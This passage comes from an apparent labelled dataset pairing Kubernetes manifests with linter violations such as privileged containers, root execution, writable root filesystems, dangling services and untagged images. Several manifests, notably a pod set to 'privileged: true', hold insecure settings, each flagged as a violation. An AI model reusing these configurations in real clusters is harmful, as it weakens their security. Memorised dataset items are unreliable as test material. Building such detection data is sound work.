    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: openshift-authentication-operator\n  name: authentication-operator\n  labels:\n    app: authentication-operator\n  annotations:\n    include.release.openshift.io/self-managed-high-availability: 'true'\n    include.release.openshift.io/single-node-developer: 'true'\n    config.openshift.io/inject-proxy: authentication-operator\n    exclude.release.openshift.io/internal-openshift-hosted: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: authentication-operator\n  template:\n    metadata:\n      name: authentication-operator\n      labels:\n        app: authentication-operator\n    spec:\n      serviceAccountName: authentication-operator\n      containers:\n      - name: authentication-operator\n        image: quay.io/openshift/origin-cluster-authentication-operator:v4.0\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/bash\n        - -ec\n        args:\n        - \"if [ -s /var/run/configmaps/trusted-ca-bundle/ca-bundle.crt ]; then\\n \\\n          \\   echo \\\"Copying system trust bundle\\\"\\n    cp -f /var/run/configmaps/trusted-ca-bundle/ca-bundle.crt\\\n          \\ /etc/pki/ca-trust/extracted/pem/tls-ca-bundle.pem\\nfi\\nexec authentication-operator\\\n          \\ operator --config=/var/run/configmaps/config/operator-config.yaml --v=2\\\n          \\ --terminate-on-files=/var/run/configmaps/trusted-ca-bundle/ca-bundle.crt\\n\"\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n        securityContext:\n          readOnlyRootFilesystem: false\n        volumeMounts:\n        - mountPath: /var/run/configmaps/config\n          name: config\n        - mountPath: /var/run/secrets/serving-cert\n          name: serving-cert\n        - mountPath: /var/run/configmaps/trusted-ca-bundle\n          name: trusted-ca-bundle\n          readOnly: true\n        - mountPath: /var/run/configmaps/service-ca-bundle\n          name: service-ca-bundle\n          readOnly: true\n        env:\n        - name: IMAGE_OAUTH_SERVER\n          value: quay.io/openshift/origin-oauth-server:v4.2\n        - name: IMAGE_OAUTH_APISERVER\n          value: quay.io/openshift/origin-oauth-apiserver:v4.6\n        - name: OPERATOR_IMAGE_VERSION\n          value: 0.0.1-snapshot\n        - name: OPERAND_OAUTH_SERVER_IMAGE_VERSION\n          value: 0.0.1-snapshot_openshift\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n      volumes:\n      - name: config\n        configMap:\n          defaultMode: 440\n          name: authentication-operator-config\n      - name: trusted-ca-bundle\n        configMap:\n          name: trusted-ca-bundle\n          optional: true\n      - name: serving-cert\n        secret:\n          secretName: serving-cert\n          optional: true\n      - name: service-ca-bundle\n        configMap:\n          name: service-ca-bundle\n          optional: true\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"authentication-operator\" is not set to runAsNonRoot"
  },
  {
    "id": "10490",
    "manifest_path": "data/manifests/the_stack_sample/sample_4055.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: openshift-authentication-operator\n  name: authentication-operator\n  labels:\n    app: authentication-operator\n  annotations:\n    include.release.openshift.io/self-managed-high-availability: 'true'\n    include.release.openshift.io/single-node-developer: 'true'\n    config.openshift.io/inject-proxy: authentication-operator\n    exclude.release.openshift.io/internal-openshift-hosted: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: authentication-operator\n  template:\n    metadata:\n      name: authentication-operator\n      labels:\n        app: authentication-operator\n    spec:\n      serviceAccountName: authentication-operator\n      containers:\n      - name: authentication-operator\n        image: quay.io/openshift/origin-cluster-authentication-operator:v4.0\n        imagePullPolicy: IfNotPresent\n        command:\n        - /bin/bash\n        - -ec\n        args:\n        - \"if [ -s /var/run/configmaps/trusted-ca-bundle/ca-bundle.crt ]; then\\n \\\n          \\   echo \\\"Copying system trust bundle\\\"\\n    cp -f /var/run/configmaps/trusted-ca-bundle/ca-bundle.crt\\\n          \\ /etc/pki/ca-trust/extracted/pem/tls-ca-bundle.pem\\nfi\\nexec authentication-operator\\\n          \\ operator --config=/var/run/configmaps/config/operator-config.yaml --v=2\\\n          \\ --terminate-on-files=/var/run/configmaps/trusted-ca-bundle/ca-bundle.crt\\n\"\n        resources:\n          requests:\n            memory: 50Mi\n            cpu: 10m\n        securityContext:\n          readOnlyRootFilesystem: false\n        volumeMounts:\n        - mountPath: /var/run/configmaps/config\n          name: config\n        - mountPath: /var/run/secrets/serving-cert\n          name: serving-cert\n        - mountPath: /var/run/configmaps/trusted-ca-bundle\n          name: trusted-ca-bundle\n          readOnly: true\n        - mountPath: /var/run/configmaps/service-ca-bundle\n          name: service-ca-bundle\n          readOnly: true\n        env:\n        - name: IMAGE_OAUTH_SERVER\n          value: quay.io/openshift/origin-oauth-server:v4.2\n        - name: IMAGE_OAUTH_APISERVER\n          value: quay.io/openshift/origin-oauth-apiserver:v4.6\n        - name: OPERATOR_IMAGE_VERSION\n          value: 0.0.1-snapshot\n        - name: OPERAND_OAUTH_SERVER_IMAGE_VERSION\n          value: 0.0.1-snapshot_openshift\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n      volumes:\n      - name: config\n        configMap:\n          defaultMode: 440\n          name: authentication-operator-config\n      - name: trusted-ca-bundle\n        configMap:\n          name: trusted-ca-bundle\n          optional: true\n      - name: serving-cert\n        secret:\n          secretName: serving-cert\n          optional: true\n      - name: service-ca-bundle\n        configMap:\n          name: service-ca-bundle\n          optional: true\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"authentication-operator\" has memory limit 0"
  },
  {
    "id": "10491",
    "manifest_path": "data/manifests/the_stack_sample/sample_4057.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    app: ex1\n  name: my-service-cip\n  namespace: jmcf\nspec:\n  ports:\n  - name: 8080-80\n    port: 8080\n    protocol: TCP\n    targetPort: 80\n  selector:\n    app: ex1\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:ex1])"
  },
  {
    "id": "10492",
    "manifest_path": "data/manifests/the_stack_sample/sample_4060.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    name: glusterblock-pod2\n  name: glusterblock-pod2\nspec:\n  containers:\n  - image: gcr.io/google_containers/nginx-slim:0.8\n    name: glusterblock-pod2\n    ports:\n    - containerPort: 80\n      name: web\n    securityContext:\n      privileged: true\n    volumeMounts:\n    - mountPath: /usr/share/nginx/html\n      name: glusterblock-vol1\n  volumes:\n  - name: glusterblock-vol1\n    persistentVolumeClaim:\n      claimName: claim1\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"glusterblock-pod2\" does not have a read-only root file system"
  },
  {
    "id": "10493",
    "manifest_path": "data/manifests/the_stack_sample/sample_4060.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    name: glusterblock-pod2\n  name: glusterblock-pod2\nspec:\n  containers:\n  - image: gcr.io/google_containers/nginx-slim:0.8\n    name: glusterblock-pod2\n    ports:\n    - containerPort: 80\n      name: web\n    securityContext:\n      privileged: true\n    volumeMounts:\n    - mountPath: /usr/share/nginx/html\n      name: glusterblock-vol1\n  volumes:\n  - name: glusterblock-vol1\n    persistentVolumeClaim:\n      claimName: claim1\n",
    "policy_id": "privilege-escalation-container",
    "violation_text": "container \"glusterblock-pod2\" is Privileged hence allows privilege escalation."
  },
  {
    "id": "10494",
    "manifest_path": "data/manifests/the_stack_sample/sample_4060.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    name: glusterblock-pod2\n  name: glusterblock-pod2\nspec:\n  containers:\n  - image: gcr.io/google_containers/nginx-slim:0.8\n    name: glusterblock-pod2\n    ports:\n    - containerPort: 80\n      name: web\n    securityContext:\n      privileged: true\n    volumeMounts:\n    - mountPath: /usr/share/nginx/html\n      name: glusterblock-vol1\n  volumes:\n  - name: glusterblock-vol1\n    persistentVolumeClaim:\n      claimName: claim1\n",
    "policy_id": "privileged-container",
    "violation_text": "container \"glusterblock-pod2\" is privileged"
  },
  {
    "id": "10495",
    "manifest_path": "data/manifests/the_stack_sample/sample_4060.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    name: glusterblock-pod2\n  name: glusterblock-pod2\nspec:\n  containers:\n  - image: gcr.io/google_containers/nginx-slim:0.8\n    name: glusterblock-pod2\n    ports:\n    - containerPort: 80\n      name: web\n    securityContext:\n      privileged: true\n    volumeMounts:\n    - mountPath: /usr/share/nginx/html\n      name: glusterblock-vol1\n  volumes:\n  - name: glusterblock-vol1\n    persistentVolumeClaim:\n      claimName: claim1\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"glusterblock-pod2\" is not set to runAsNonRoot"
  },
  {
    "id": "10496",
    "manifest_path": "data/manifests/the_stack_sample/sample_4060.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    name: glusterblock-pod2\n  name: glusterblock-pod2\nspec:\n  containers:\n  - image: gcr.io/google_containers/nginx-slim:0.8\n    name: glusterblock-pod2\n    ports:\n    - containerPort: 80\n      name: web\n    securityContext:\n      privileged: true\n    volumeMounts:\n    - mountPath: /usr/share/nginx/html\n      name: glusterblock-vol1\n  volumes:\n  - name: glusterblock-vol1\n    persistentVolumeClaim:\n      claimName: claim1\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"glusterblock-pod2\" has cpu request 0"
  },
  {
    "id": "10497",
    "manifest_path": "data/manifests/the_stack_sample/sample_4060.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  labels:\n    name: glusterblock-pod2\n  name: glusterblock-pod2\nspec:\n  containers:\n  - image: gcr.io/google_containers/nginx-slim:0.8\n    name: glusterblock-pod2\n    ports:\n    - containerPort: 80\n      name: web\n    securityContext:\n      privileged: true\n    volumeMounts:\n    - mountPath: /usr/share/nginx/html\n      name: glusterblock-vol1\n  volumes:\n  - name: glusterblock-vol1\n    persistentVolumeClaim:\n      claimName: claim1\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"glusterblock-pod2\" has memory limit 0"
  },
  {
    "id": "10498",
    "manifest_path": "data/manifests/the_stack_sample/sample_4061.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mailman-core-utils\n  namespace: mail\n  labels:\n    component: mail-core-utils\n    app: mail-suit-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: mail-core-utils\n      app: mail-suit-service\n  template:\n    metadata:\n      labels:\n        component: mail-core-utils\n        app: mail-suit-service\n    spec:\n      initContainers:\n      - name: mail-git-tools\n        image: swr.cn-north-4.myhuaweicloud.com/opensourceway/common/git-tools:3130dbea23dd51e5ccd373af860427b3ed730f14\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - mountPath: /opt/mailman-utils/data_source\n          name: mailman-core-utils\n        env:\n        - name: TEMPLATE_REPO\n          value: https://github.com/opensourceways/app-mailman.git\n        command:\n        - /bin/sh\n        - -c\n        - 'cd /opt/mailman-utils/data_source;\n\n          git clone ${TEMPLATE_REPO}\n\n          '\n      containers:\n      - name: mailman-core-utils\n        image: swr.cn-north-4.myhuaweicloud.com/opensourceway/common/mailman-core-utils:3130dbea23dd51e5ccd373af860427b3ed730f14\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - mountPath: /opt/mailman-utils/data_source\n          name: mailman-core-utils\n        env:\n        - name: MAILMAN_CORE_ENDPOINT\n          value: http://mailman-core-0.mail-suit-service.mail.svc.cluster.local:8001/3.1\n        - name: MAILMAN_CORE_USER\n          valueFrom:\n            secretKeyRef:\n              name: mailman-secrets\n              key: mailman_core_user\n        - name: MAILMAN_CORE_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mailman-secrets\n              key: mailman_core_password\n        - name: TEMPLATE_FOLDER_PATH\n          value: templates\n        command:\n        - /bin/sh\n        - -c\n        - 'cp -r /opt/mailman-utils/data_source/app-mailman/mail/templates  .;\n\n          docker-entrypoint.sh python -u mailman-core-utils.py\n\n          sleep infinity\n\n          '\n      volumes:\n      - name: mailman-core-utils\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mail-git-tools\" does not have a read-only root file system"
  },
  {
    "id": "10499",
    "manifest_path": "data/manifests/the_stack_sample/sample_4061.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mailman-core-utils\n  namespace: mail\n  labels:\n    component: mail-core-utils\n    app: mail-suit-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: mail-core-utils\n      app: mail-suit-service\n  template:\n    metadata:\n      labels:\n        component: mail-core-utils\n        app: mail-suit-service\n    spec:\n      initContainers:\n      - name: mail-git-tools\n        image: swr.cn-north-4.myhuaweicloud.com/opensourceway/common/git-tools:3130dbea23dd51e5ccd373af860427b3ed730f14\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - mountPath: /opt/mailman-utils/data_source\n          name: mailman-core-utils\n        env:\n        - name: TEMPLATE_REPO\n          value: https://github.com/opensourceways/app-mailman.git\n        command:\n        - /bin/sh\n        - -c\n        - 'cd /opt/mailman-utils/data_source;\n\n          git clone ${TEMPLATE_REPO}\n\n          '\n      containers:\n      - name: mailman-core-utils\n        image: swr.cn-north-4.myhuaweicloud.com/opensourceway/common/mailman-core-utils:3130dbea23dd51e5ccd373af860427b3ed730f14\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - mountPath: /opt/mailman-utils/data_source\n          name: mailman-core-utils\n        env:\n        - name: MAILMAN_CORE_ENDPOINT\n          value: http://mailman-core-0.mail-suit-service.mail.svc.cluster.local:8001/3.1\n        - name: MAILMAN_CORE_USER\n          valueFrom:\n            secretKeyRef:\n              name: mailman-secrets\n              key: mailman_core_user\n        - name: MAILMAN_CORE_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mailman-secrets\n              key: mailman_core_password\n        - name: TEMPLATE_FOLDER_PATH\n          value: templates\n        command:\n        - /bin/sh\n        - -c\n        - 'cp -r /opt/mailman-utils/data_source/app-mailman/mail/templates  .;\n\n          docker-entrypoint.sh python -u mailman-core-utils.py\n\n          sleep infinity\n\n          '\n      volumes:\n      - name: mailman-core-utils\n        emptyDir: {}\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mailman-core-utils\" does not have a read-only root file system"
  },
  {
    "id": "10500",
    "manifest_path": "data/manifests/the_stack_sample/sample_4061.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mailman-core-utils\n  namespace: mail\n  labels:\n    component: mail-core-utils\n    app: mail-suit-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: mail-core-utils\n      app: mail-suit-service\n  template:\n    metadata:\n      labels:\n        component: mail-core-utils\n        app: mail-suit-service\n    spec:\n      initContainers:\n      - name: mail-git-tools\n        image: swr.cn-north-4.myhuaweicloud.com/opensourceway/common/git-tools:3130dbea23dd51e5ccd373af860427b3ed730f14\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - mountPath: /opt/mailman-utils/data_source\n          name: mailman-core-utils\n        env:\n        - name: TEMPLATE_REPO\n          value: https://github.com/opensourceways/app-mailman.git\n        command:\n        - /bin/sh\n        - -c\n        - 'cd /opt/mailman-utils/data_source;\n\n          git clone ${TEMPLATE_REPO}\n\n          '\n      containers:\n      - name: mailman-core-utils\n        image: swr.cn-north-4.myhuaweicloud.com/opensourceway/common/mailman-core-utils:3130dbea23dd51e5ccd373af860427b3ed730f14\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - mountPath: /opt/mailman-utils/data_source\n          name: mailman-core-utils\n        env:\n        - name: MAILMAN_CORE_ENDPOINT\n          value: http://mailman-core-0.mail-suit-service.mail.svc.cluster.local:8001/3.1\n        - name: MAILMAN_CORE_USER\n          valueFrom:\n            secretKeyRef:\n              name: mailman-secrets\n              key: mailman_core_user\n        - name: MAILMAN_CORE_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mailman-secrets\n              key: mailman_core_password\n        - name: TEMPLATE_FOLDER_PATH\n          value: templates\n        command:\n        - /bin/sh\n        - -c\n        - 'cp -r /opt/mailman-utils/data_source/app-mailman/mail/templates  .;\n\n          docker-entrypoint.sh python -u mailman-core-utils.py\n\n          sleep infinity\n\n          '\n      volumes:\n      - name: mailman-core-utils\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mail-git-tools\" is not set to runAsNonRoot"
  },
  {
    "id": "10501",
    "manifest_path": "data/manifests/the_stack_sample/sample_4061.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mailman-core-utils\n  namespace: mail\n  labels:\n    component: mail-core-utils\n    app: mail-suit-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: mail-core-utils\n      app: mail-suit-service\n  template:\n    metadata:\n      labels:\n        component: mail-core-utils\n        app: mail-suit-service\n    spec:\n      initContainers:\n      - name: mail-git-tools\n        image: swr.cn-north-4.myhuaweicloud.com/opensourceway/common/git-tools:3130dbea23dd51e5ccd373af860427b3ed730f14\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - mountPath: /opt/mailman-utils/data_source\n          name: mailman-core-utils\n        env:\n        - name: TEMPLATE_REPO\n          value: https://github.com/opensourceways/app-mailman.git\n        command:\n        - /bin/sh\n        - -c\n        - 'cd /opt/mailman-utils/data_source;\n\n          git clone ${TEMPLATE_REPO}\n\n          '\n      containers:\n      - name: mailman-core-utils\n        image: swr.cn-north-4.myhuaweicloud.com/opensourceway/common/mailman-core-utils:3130dbea23dd51e5ccd373af860427b3ed730f14\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - mountPath: /opt/mailman-utils/data_source\n          name: mailman-core-utils\n        env:\n        - name: MAILMAN_CORE_ENDPOINT\n          value: http://mailman-core-0.mail-suit-service.mail.svc.cluster.local:8001/3.1\n        - name: MAILMAN_CORE_USER\n          valueFrom:\n            secretKeyRef:\n              name: mailman-secrets\n              key: mailman_core_user\n        - name: MAILMAN_CORE_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mailman-secrets\n              key: mailman_core_password\n        - name: TEMPLATE_FOLDER_PATH\n          value: templates\n        command:\n        - /bin/sh\n        - -c\n        - 'cp -r /opt/mailman-utils/data_source/app-mailman/mail/templates  .;\n\n          docker-entrypoint.sh python -u mailman-core-utils.py\n\n          sleep infinity\n\n          '\n      volumes:\n      - name: mailman-core-utils\n        emptyDir: {}\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mailman-core-utils\" is not set to runAsNonRoot"
  },
  {
    "id": "10502",
    "manifest_path": "data/manifests/the_stack_sample/sample_4061.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mailman-core-utils\n  namespace: mail\n  labels:\n    component: mail-core-utils\n    app: mail-suit-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: mail-core-utils\n      app: mail-suit-service\n  template:\n    metadata:\n      labels:\n        component: mail-core-utils\n        app: mail-suit-service\n    spec:\n      initContainers:\n      - name: mail-git-tools\n        image: swr.cn-north-4.myhuaweicloud.com/opensourceway/common/git-tools:3130dbea23dd51e5ccd373af860427b3ed730f14\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - mountPath: /opt/mailman-utils/data_source\n          name: mailman-core-utils\n        env:\n        - name: TEMPLATE_REPO\n          value: https://github.com/opensourceways/app-mailman.git\n        command:\n        - /bin/sh\n        - -c\n        - 'cd /opt/mailman-utils/data_source;\n\n          git clone ${TEMPLATE_REPO}\n\n          '\n      containers:\n      - name: mailman-core-utils\n        image: swr.cn-north-4.myhuaweicloud.com/opensourceway/common/mailman-core-utils:3130dbea23dd51e5ccd373af860427b3ed730f14\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - mountPath: /opt/mailman-utils/data_source\n          name: mailman-core-utils\n        env:\n        - name: MAILMAN_CORE_ENDPOINT\n          value: http://mailman-core-0.mail-suit-service.mail.svc.cluster.local:8001/3.1\n        - name: MAILMAN_CORE_USER\n          valueFrom:\n            secretKeyRef:\n              name: mailman-secrets\n              key: mailman_core_user\n        - name: MAILMAN_CORE_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mailman-secrets\n              key: mailman_core_password\n        - name: TEMPLATE_FOLDER_PATH\n          value: templates\n        command:\n        - /bin/sh\n        - -c\n        - 'cp -r /opt/mailman-utils/data_source/app-mailman/mail/templates  .;\n\n          docker-entrypoint.sh python -u mailman-core-utils.py\n\n          sleep infinity\n\n          '\n      volumes:\n      - name: mailman-core-utils\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"mail-git-tools\" has cpu request 0"
  },
  {
    "id": "10503",
    "manifest_path": "data/manifests/the_stack_sample/sample_4061.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mailman-core-utils\n  namespace: mail\n  labels:\n    component: mail-core-utils\n    app: mail-suit-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: mail-core-utils\n      app: mail-suit-service\n  template:\n    metadata:\n      labels:\n        component: mail-core-utils\n        app: mail-suit-service\n    spec:\n      initContainers:\n      - name: mail-git-tools\n        image: swr.cn-north-4.myhuaweicloud.com/opensourceway/common/git-tools:3130dbea23dd51e5ccd373af860427b3ed730f14\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - mountPath: /opt/mailman-utils/data_source\n          name: mailman-core-utils\n        env:\n        - name: TEMPLATE_REPO\n          value: https://github.com/opensourceways/app-mailman.git\n        command:\n        - /bin/sh\n        - -c\n        - 'cd /opt/mailman-utils/data_source;\n\n          git clone ${TEMPLATE_REPO}\n\n          '\n      containers:\n      - name: mailman-core-utils\n        image: swr.cn-north-4.myhuaweicloud.com/opensourceway/common/mailman-core-utils:3130dbea23dd51e5ccd373af860427b3ed730f14\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - mountPath: /opt/mailman-utils/data_source\n          name: mailman-core-utils\n        env:\n        - name: MAILMAN_CORE_ENDPOINT\n          value: http://mailman-core-0.mail-suit-service.mail.svc.cluster.local:8001/3.1\n        - name: MAILMAN_CORE_USER\n          valueFrom:\n            secretKeyRef:\n              name: mailman-secrets\n              key: mailman_core_user\n        - name: MAILMAN_CORE_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mailman-secrets\n              key: mailman_core_password\n        - name: TEMPLATE_FOLDER_PATH\n          value: templates\n        command:\n        - /bin/sh\n        - -c\n        - 'cp -r /opt/mailman-utils/data_source/app-mailman/mail/templates  .;\n\n          docker-entrypoint.sh python -u mailman-core-utils.py\n\n          sleep infinity\n\n          '\n      volumes:\n      - name: mailman-core-utils\n        emptyDir: {}\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"mailman-core-utils\" has cpu request 0"
  },
  {
    "id": "10504",
    "manifest_path": "data/manifests/the_stack_sample/sample_4061.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mailman-core-utils\n  namespace: mail\n  labels:\n    component: mail-core-utils\n    app: mail-suit-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: mail-core-utils\n      app: mail-suit-service\n  template:\n    metadata:\n      labels:\n        component: mail-core-utils\n        app: mail-suit-service\n    spec:\n      initContainers:\n      - name: mail-git-tools\n        image: swr.cn-north-4.myhuaweicloud.com/opensourceway/common/git-tools:3130dbea23dd51e5ccd373af860427b3ed730f14\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - mountPath: /opt/mailman-utils/data_source\n          name: mailman-core-utils\n        env:\n        - name: TEMPLATE_REPO\n          value: https://github.com/opensourceways/app-mailman.git\n        command:\n        - /bin/sh\n        - -c\n        - 'cd /opt/mailman-utils/data_source;\n\n          git clone ${TEMPLATE_REPO}\n\n          '\n      containers:\n      - name: mailman-core-utils\n        image: swr.cn-north-4.myhuaweicloud.com/opensourceway/common/mailman-core-utils:3130dbea23dd51e5ccd373af860427b3ed730f14\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - mountPath: /opt/mailman-utils/data_source\n          name: mailman-core-utils\n        env:\n        - name: MAILMAN_CORE_ENDPOINT\n          value: http://mailman-core-0.mail-suit-service.mail.svc.cluster.local:8001/3.1\n        - name: MAILMAN_CORE_USER\n          valueFrom:\n            secretKeyRef:\n              name: mailman-secrets\n              key: mailman_core_user\n        - name: MAILMAN_CORE_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mailman-secrets\n              key: mailman_core_password\n        - name: TEMPLATE_FOLDER_PATH\n          value: templates\n        command:\n        - /bin/sh\n        - -c\n        - 'cp -r /opt/mailman-utils/data_source/app-mailman/mail/templates  .;\n\n          docker-entrypoint.sh python -u mailman-core-utils.py\n\n          sleep infinity\n\n          '\n      volumes:\n      - name: mailman-core-utils\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"mail-git-tools\" has memory limit 0"
  },
  {
    "id": "10505",
    "manifest_path": "data/manifests/the_stack_sample/sample_4061.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: mailman-core-utils\n  namespace: mail\n  labels:\n    component: mail-core-utils\n    app: mail-suit-service\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      component: mail-core-utils\n      app: mail-suit-service\n  template:\n    metadata:\n      labels:\n        component: mail-core-utils\n        app: mail-suit-service\n    spec:\n      initContainers:\n      - name: mail-git-tools\n        image: swr.cn-north-4.myhuaweicloud.com/opensourceway/common/git-tools:3130dbea23dd51e5ccd373af860427b3ed730f14\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - mountPath: /opt/mailman-utils/data_source\n          name: mailman-core-utils\n        env:\n        - name: TEMPLATE_REPO\n          value: https://github.com/opensourceways/app-mailman.git\n        command:\n        - /bin/sh\n        - -c\n        - 'cd /opt/mailman-utils/data_source;\n\n          git clone ${TEMPLATE_REPO}\n\n          '\n      containers:\n      - name: mailman-core-utils\n        image: swr.cn-north-4.myhuaweicloud.com/opensourceway/common/mailman-core-utils:3130dbea23dd51e5ccd373af860427b3ed730f14\n        imagePullPolicy: IfNotPresent\n        volumeMounts:\n        - mountPath: /opt/mailman-utils/data_source\n          name: mailman-core-utils\n        env:\n        - name: MAILMAN_CORE_ENDPOINT\n          value: http://mailman-core-0.mail-suit-service.mail.svc.cluster.local:8001/3.1\n        - name: MAILMAN_CORE_USER\n          valueFrom:\n            secretKeyRef:\n              name: mailman-secrets\n              key: mailman_core_user\n        - name: MAILMAN_CORE_PASSWORD\n          valueFrom:\n            secretKeyRef:\n              name: mailman-secrets\n              key: mailman_core_password\n        - name: TEMPLATE_FOLDER_PATH\n          value: templates\n        command:\n        - /bin/sh\n        - -c\n        - 'cp -r /opt/mailman-utils/data_source/app-mailman/mail/templates  .;\n\n          docker-entrypoint.sh python -u mailman-core-utils.py\n\n          sleep infinity\n\n          '\n      volumes:\n      - name: mailman-core-utils\n        emptyDir: {}\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"mailman-core-utils\" has memory limit 0"
  },
  {
    "id": "10506",
    "manifest_path": "data/manifests/the_stack_sample/sample_4062.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: simplenode\nspec:\n  type: ClusterIP\n  ports:\n  - name: http\n    port: 80\n    protocol: TCP\n    targetPort: 8080\n  selector:\n    app: simplenode\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:simplenode])"
  },
  {
    "id": "10507",
    "manifest_path": "data/manifests/the_stack_sample/sample_4064.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: event-listener-service\n  labels:\n    app: eventtest\nspec:\n  ports:\n  - port: 80\n    targetPort: 3000\n    protocol: TCP\n  selector:\n    app: eventtest\n  type: LoadBalancer\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:eventtest])"
  },
  {
    "id": "10508",
    "manifest_path": "data/manifests/the_stack_sample/sample_4067.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: node-pod\nspec:\n  containers:\n  - name: node-container\n    image: node\n    ports:\n    - containerPort: 8080\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"node-container\" is using an invalid container image, \"node\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "10509",
    "manifest_path": "data/manifests/the_stack_sample/sample_4067.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: node-pod\nspec:\n  containers:\n  - name: node-container\n    image: node\n    ports:\n    - containerPort: 8080\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"node-container\" does not have a read-only root file system"
  },
  {
    "id": "10510",
    "manifest_path": "data/manifests/the_stack_sample/sample_4067.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: node-pod\nspec:\n  containers:\n  - name: node-container\n    image: node\n    ports:\n    - containerPort: 8080\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"node-container\" is not set to runAsNonRoot"
  },
  {
    "id": "10511",
    "manifest_path": "data/manifests/the_stack_sample/sample_4067.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: node-pod\nspec:\n  containers:\n  - name: node-container\n    image: node\n    ports:\n    - containerPort: 8080\n",
    "policy_id": "unset-cpu-requirements",
